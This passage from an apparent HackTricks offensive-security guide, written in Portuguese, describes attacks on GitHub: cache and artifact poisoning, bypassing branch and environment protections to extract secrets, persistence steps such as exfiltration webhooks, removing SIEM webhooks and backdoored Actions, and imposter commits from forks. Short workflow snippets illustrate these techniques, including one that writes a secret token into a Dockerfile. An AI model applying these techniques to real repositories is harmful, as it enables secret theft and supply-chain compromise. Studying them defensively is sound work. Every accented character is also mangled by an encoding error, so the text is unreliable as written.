* A√ß√£o de **p√≥s-fluxo de trabalho** - usada para salvar o cache. Se o resultado da chamada de cache na a√ß√£o de execu√ß√£o retornar um cache-miss, esta a√ß√£o salvar√° o estado atual dos diret√≥rios que desejamos armazenar em cache com a chave fornecida. Essa a√ß√£o acontece automaticamente e n√£o precisa ser chamada explicitamente.

As **restri√ß√µes de acesso** fornecem **isolamento de cache** e seguran√ßa criando um **limite l√≥gico entre diferentes branches** _(por exemplo: um cache criado para o branch **Feature-A** \[com base no main] n√£o seria acess√≠vel a uma solicita√ß√£o de pull para o branch **Feature-B** \[com base no main])_.

A a√ß√£o de cache primeiro procura por acertos de cache para uma chave e restaura as chaves no branch que cont√©m a **execu√ß√£o do fluxo de trabalho**. Se n√£o houver acertos no branch atual, a a√ß√£o de cache procura pela chave e restaura as chaves no branch pai e nos branches superiores.

O acesso a um cache √© limitado por branch (atual e pai), o que significa que o acesso √© fornecido a todos os **fluxos de trabalho** em **execu√ß√µes** desse branch.

Outra observa√ß√£o importante √© que o GitHub n√£o permite modifica√ß√µes uma vez que as entradas s√£o enviadas - as entradas de cache s√£o registros somente leitura.

Usamos um exemplo de CI que inclu√≠a dois fluxos de trabalho. Este exemplo mostra como um ataque pode se mover de um fluxo de trabalho de baixa permiss√£o para um de alta permiss√£o.

* Fluxo de trabalho de **teste unit√°rio** executando testes unit√°rios e ferramentas de cobertura de c√≥digo. Supomos que uma das ferramentas seja maliciosa ou vulner√°vel √† execu√ß√£o remota de c√≥digo. O fluxo de trabalho n√£o precisa usar a a√ß√£o **action/cache** do Git. Qualquer fluxo de trabalho pode acessar o cache.
* Fluxo de trabalho de **lan√ßamento** que constr√≥i e lan√ßa o artefato da aplica√ß√£o. Este fluxo de trabalho usa um cache para otimizar o uso das depend√™ncias do Golang.

O fluxo de trabalho de **teste unit√°rio** usa uma a√ß√£o maliciosa que adiciona uma entrada de cache com conte√∫do malicioso alterando uma biblioteca de registro do Golang (**go.uber.org/zap@v1**) para adicionar a string 'BAD library' √† descri√ß√£o do artefato da aplica√ß√£o.

Em seguida, o fluxo de trabalho de **lan√ßamento** usa essa entrada de cache envenenada. Como resultado, o c√≥digo malicioso √© injetado no bin√°rio Golang e na imagem constru√≠da. O cache permanece envenenado at√© que a chave da entrada seja descartada (geralmente acionada por atualiza√ß√µes de depend√™ncia). O mesmo cache envenenado afetar√° qualquer outro **fluxo de trabalho**, **execu√ß√£o** e **branch filho** que use a mesma chave de cache.

No teste que realizamos, conseguimos injetar a string 'BAD library' na descri√ß√£o da imagem:

![BAD library](https://scribesecurity.com/wp-content/uploads/2022/02/BAD-library-2-300x79.jpg)

Isso foi na vers√£o 0.4.1. Em seguida, atualizamos a tag e reconstru√≠mos a imagem v√°rias vezes e observamos que 'Bad library' permaneceu na descri√ß√£o.

Essas t√©cnicas foram retiradas de [https://scribesecurity.com/blog/github-cache-poisoning/](https://scribesecurity.com/blog/github-cache-poisoning/)

### Envenenamento de Artefato

Existem v√°rias A√ß√µes do Github que permitem **baixar artefatos de outros reposit√≥rios**. Esses outros reposit√≥rios geralmente ter√£o uma A√ß√£o do Github para **fazer upload do artefato** que ser√° posteriormente baixado.\
Se a **A√ß√£o do Github** do reposit√≥rio que faz o upload do artefato permitir o uso de **`pull_request`** ou **`pull_request_target`** (usando o c√≥digo do atacante), um atacante poder√° acionar a A√ß√£o que far√° o upload de um Artefato criado a partir de seu c√≥digo, para que qualquer outro reposit√≥rio que fa√ßa o download e execute o artefato mais recente seja comprometido.

{% hint style="info" %}
Como mencionado em uma se√ß√£o deste post, **`pull_requests`** geralmente exigir√£o uma **aprova√ß√£o manual** de um mantenedor do reposit√≥rio.
{% endhint %}

Exemplo de **download de artefato de um reposit√≥rio diferente**:

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Como mencionado anteriormente, em um acionador de **`pull_request`**, a A√ß√£o definida no PR √© a que √© executada. Portanto, um **atacante** poderia **definir** l√° a **a√ß√£o de upload** do **artefato** que ele gostaria de comprometer.

Portanto, um atacante n√£o precisa atacar um acionador de **`pull_request`** na a√ß√£o de upload do artefato, mas apenas qualquer acionador de **`pull_request`**.
{% endhint %}

Para mais informa√ß√µes e op√ß√µes de defesa (como codificar o artefato a ser baixado), consulte [https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust](https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust)
### Roubo de Reposit√≥rio de Namespace Exclu√≠do

Este √© um bom post de blog para ler sobre vulnerabilidades corrigidas que permitiriam a um invasor roubar um namespace exclu√≠do para roubar um reposit√≥rio famoso (potencialmente devido a uma altera√ß√£o de nome do namespace): [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

### Registro de Imagens Docker do Github

√â poss√≠vel criar a√ß√µes no Github que ir√£o **construir e armazenar uma imagem Docker dentro do Github**.\
Um exemplo pode ser encontrado no seguinte trecho:

<details>

<summary>A√ß√£o do Github para Construir e Enviar uma Imagem Docker</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Como voc√™ pode ver no c√≥digo anterior, o registro do Github √© hospedado em **`ghcr.io`**.

Um usu√°rio com permiss√µes de leitura sobre o reposit√≥rio poder√° ent√£o baixar a imagem Docker usando um token de acesso pessoal:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Em seguida, o usu√°rio pode procurar por **segredos vazados nas camadas da imagem Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

## Bypass de Prote√ß√£o de Branch

* **Exigir um n√∫mero de aprova√ß√µes**: Se voc√™ comprometer v√°rias contas, pode aceitar suas PRs de outras contas. Se voc√™ tiver apenas a conta de onde criou a PR, n√£o poder√° aceitar sua pr√≥pria PR. No entanto, se tiver acesso a um ambiente de **Github Action** dentro do reposit√≥rio, usando o **GITHUB\_TOKEN**, voc√™ pode ser capaz de **aprovar sua PR** e obter 1 aprova√ß√£o dessa forma.
* _Observa√ß√£o para esta restri√ß√£o e para a restri√ß√£o de propriet√°rios de c√≥digo, geralmente um usu√°rio n√£o poder√° aprovar suas pr√≥prias PRs, mas se voc√™ puder, pode abusar disso para aceitar suas PRs._
* **Ignorar aprova√ß√µes quando novos commits s√£o enviados**: Se isso n√£o estiver definido, voc√™ pode enviar c√≥digo leg√≠timo, aguardar at√© que algu√©m aprove e inserir c√≥digo malicioso e mescl√°-lo na branch protegida.
* **Exigir revis√µes dos propriet√°rios de c√≥digo**: Se isso estiver ativado e voc√™ for um propriet√°rio de c√≥digo, poder√° fazer com que uma **Github Action crie sua PR e, em seguida, a aprove voc√™ mesmo**.
* Quando um arquivo **CODEOWNER est√° mal configurado**, o Github n√£o reclama, mas tamb√©m n√£o o usa. Portanto, se estiver mal configurado, sua **prote√ß√£o de propriet√°rios de c√≥digo n√£o ser√° aplicada**.
* **Permitir que atores especificados ignorem os requisitos de pull request**: Se voc√™ for um desses atores, poder√° ignorar as prote√ß√µes de pull request.
* **Incluir administradores**: Se isso n√£o estiver definido e voc√™ for administrador do reposit√≥rio, poder√° ignorar essas prote√ß√µes de branch.
* **Sequestro de PR**: Voc√™ pode ser capaz de **modificar a PR de outra pessoa** adicionando c√≥digo malicioso, aprovando a PR resultante e mesclando tudo.
* **Removendo Prote√ß√µes de Branch**: Se voc√™ for um **administrador do reposit√≥rio, pode desativar as prote√ß√µes**, mesclar sua PR e redefinir as prote√ß√µes.
* **Burlando prote√ß√µes de push**: Se um reposit√≥rio **permite apenas que determinados usu√°rios** enviem push (mesclar c√≥digo) em branches (a prote√ß√£o de branch pode estar protegendo todas as branches especificando o caractere curinga `*`).
* Se voc√™ tiver **acesso de grava√ß√£o ao reposit√≥rio, mas n√£o tiver permiss√£o para enviar c√≥digo** por causa da prote√ß√£o de branch, ainda poder√° **criar uma nova branch** e dentro dela criar uma **github action que √© acionada quando o c√≥digo √© enviado**. Como a **prote√ß√£o de branch n√£o proteger√° a branch at√© que ela seja criada**, esse primeiro envio de c√≥digo para a branch ir√° **executar a github action**.

## Burlando Prote√ß√µes de Ambientes

Para uma introdu√ß√£o sobre [**verifica√ß√£o de ambiente do Github, verifique as informa√ß√µes b√°sicas**](basic-github-information.md#git-environments).

Caso um ambiente possa ser **acessado de todas as branches**, ele **n√£o est√° protegido** e voc√™ pode acessar facilmente os segredos dentro do ambiente. Observe que voc√™ pode encontrar reposit√≥rios onde **todas as branches est√£o protegidas** (especificando seus nomes ou usando `*`) nesse cen√°rio, **encontre uma branch onde voc√™ possa enviar c√≥digo** e voc√™ pode **extrair** os segredos criando uma nova github action (ou modificando uma).

Observe que voc√™ pode encontrar o caso limite em que **todas as branches est√£o protegidas** (via caractere curinga `*`) e √© especificado **quem pode enviar c√≥digo para as branches** (_voc√™ pode especificar isso na prote√ß√£o de branch_) e **seu usu√°rio n√£o tem permiss√£o**. Ainda √© poss√≠vel executar uma github action personalizada porque voc√™ pode criar uma branch e usar o gatilho de envio sobre si mesma. A **prote√ß√£o de branch permite o envio para uma nova branch, ent√£o a github action ser√° acionada**.
```yaml
push: # Run it when a push is made to a branch
branches:
- current_branch_name #Use '**' to run when a push is made to any branch
```
Note que **ap√≥s a cria√ß√£o** do branch, a **prote√ß√£o do branch ser√° aplicada ao novo branch** e voc√™ n√£o poder√° modific√°-lo, mas nesse momento voc√™ j√° ter√° extra√≠do as informa√ß√µes sigilosas.

## Persist√™ncia

* Gerar **token de usu√°rio**
* Roubar **tokens do Github** de **secrets**
* **Excluir** resultados de fluxo de trabalho e branches
* Dar **mais permiss√µes a toda a organiza√ß√£o**
* Criar **webhooks** para exfiltrar informa√ß√µes
* Convidar **colaboradores externos**
* **Remover** **webhooks** usados pelo **SIEM**
* Criar/modificar **Github Action** com uma **porta dos fundos**
* Encontrar **Github Action vulner√°vel para inje√ß√£o de comando** atrav√©s da modifica√ß√£o do valor do **secret**

### Commits Falsos - Porta dos fundos atrav√©s de commits no reposit√≥rio

No Github, √© poss√≠vel **criar um PR para um reposit√≥rio a partir de um fork**. Mesmo que o PR n√£o seja **aceito**, um ID de **commit** dentro do reposit√≥rio original ser√° criado para a vers√£o do c√≥digo do fork. Portanto, um atacante **poderia usar um commit espec√≠fico de um reposit√≥rio aparentemente leg√≠timo que n√£o foi criado pelo propriet√°rio do reposit√≥rio**.

Como [**este**](https://github.com/actions/checkout/commit/c7d749a2d57b4b375d1ebcd17cfbfb60c676f18e):
```yaml
name: example
on: [push]
jobs:
commit:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@c7d749a2d57b4b375d1ebcd17cfbfb60c676f18e
- shell: bash
run: |
echo 'hello world!'
```
Para mais informa√ß√µes, verifique [https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd](https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd)

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no GitHub.

</details>
